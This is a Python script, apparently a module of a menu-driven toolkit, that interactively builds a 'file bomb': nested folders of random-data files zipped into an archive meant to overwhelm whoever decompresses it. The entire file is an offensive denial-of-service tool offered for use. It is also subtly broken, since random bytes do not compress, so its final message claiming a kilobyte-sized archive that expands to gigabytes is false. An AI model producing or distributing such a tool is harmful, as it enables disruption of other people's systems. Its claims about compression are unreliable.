import os
import random
import string
import zipfile
import shutil
from tqdm import tqdm  

BOMB_BASE_PATH = "lib/tools/assets/bomb"

def random_filename(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_dummy_file(path, size_mb):
    with open(path, 'wb') as f:
        f.write(os.urandom(size_mb * 1024 * 1024))

def create_bomb_folder(path, levels, files_per_folder, file_size_mb, pbar):
    if levels == 0:
        return

    os.makedirs(path, exist_ok=True)
    pbar.update(1)  

    for _ in range(files_per_folder):
        file_path = os.path.join(path, f"file_{random_filename(6)}.bin")
        create_dummy_file(file_path, file_size_mb)
        pbar.update(1)  

    for _ in range(files_per_folder):
        nested_folder = os.path.join(path, f"folder_{random_filename(6)}")
        create_bomb_folder(nested_folder, levels - 1, files_per_folder, file_size_mb, pbar)

def zip_folder(folder_path, output_zip):
    with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                abs_path = os.path.join(root, file)
                rel_path = os.path.relpath(abs_path, start=folder_path)
                zipf.write(abs_path, rel_path)

def get_folder_size_bytes(folder_path):
    total = 0
    for root, dirs, files in os.walk(folder_path):
        for f in files:
            fp = os.path.join(root, f)
            total += os.path.getsize(fp)
    return total

def run():
    while True:
        os.system("clear")
        print("📦 Compressed File Bomb Creator")
        print("1. Create file bomb")
        print("0. Back")
        choice = input("Choose an option: ").strip()

        if choice == "0":
            break
        elif choice == "1":
            try:
                levels = int(input("Enter number of nesting levels (e.g. 3-6): "))
                files_per_folder = int(input("Enter number of files per folder (e.g. 3-10): "))
                file_size_mb = int(input("Enter size of each file in MB (e.g. 1): "))
                output_name = input("Enter output zip archive name (without extension): ").strip()
                if not output_name:
                    print("Invalid name.")
                    input("Press Enter to continue...")
                    continue
            except ValueError:
                print("Invalid input. Must be a number.")
                input("Press Enter to continue...")
                continue

            bomb_path = os.path.join(BOMB_BASE_PATH, "bomb_tmp")
            output_zip = os.path.join(BOMB_BASE_PATH, f"{output_name}.zip")

            if os.path.exists(bomb_path):
                shutil.rmtree(bomb_path)

            total_folders = sum([files_per_folder ** i for i in range(0, levels)])
            total_files = total_folders * files_per_folder
            total_progress = total_folders + total_files

            print("\n[⚙️ Creating bomb folder structure...]")
            with tqdm(total=total_progress, desc="📦 Creating", unit="item") as pbar:
                create_bomb_folder(bomb_path, levels, files_per_folder, file_size_mb, pbar)

            uncompressed_size_bytes = get_folder_size_bytes(bomb_path)
            uncompressed_size_gb = uncompressed_size_bytes / (1024**3)

            print("\n[⚙️ Zipping the bomb...]")
            zip_folder(bomb_path, output_zip)

            compressed_size_bytes = os.path.getsize(output_zip)
            compressed_size_kb = compressed_size_bytes / 1024

            print("[🗑️ Cleaning up temporary files...]")
            shutil.rmtree(bomb_path)

            print(f"\n✅ Bomb created successfully: {output_name}.zip (Size: {compressed_size_kb:.1f} KB compressed, expands to {uncompressed_size_gb:.2f} GB+)")
            input("\nPress Enter to continue...")

        else:
            print("Invalid choice.")
            input("Press Enter to continue...")
